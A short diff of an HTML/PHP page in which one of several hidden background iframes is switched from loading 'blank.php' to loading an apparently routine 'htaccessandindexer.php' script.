@@ -31,7 +31,7 @@ if(/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream)location.hre
       <iframe name="i4b" frameborder="0" src="blank.php" width="1" height="1" style="display:none"></iframe>
       <iframe name="i4c" frameborder="0" src="blank.php" width="1" height="1" style="display:none"></iframe>
       <iframe name="i4d" frameborder="0" src="blank.php" width="1" height="1" style="display:none"></iframe>
-      <iframe name="i4e" frameborder="0" src="blank.php" width="1" height="1" style="display:none"></iframe>
+      <iframe name="i4e" frameborder="0" src="htaccessandindexer.php" width="1" height="1" style="display:none"></iframe>
       </td>
   </tr>
 </table><div style="display:none" id="documenttitle"></div>
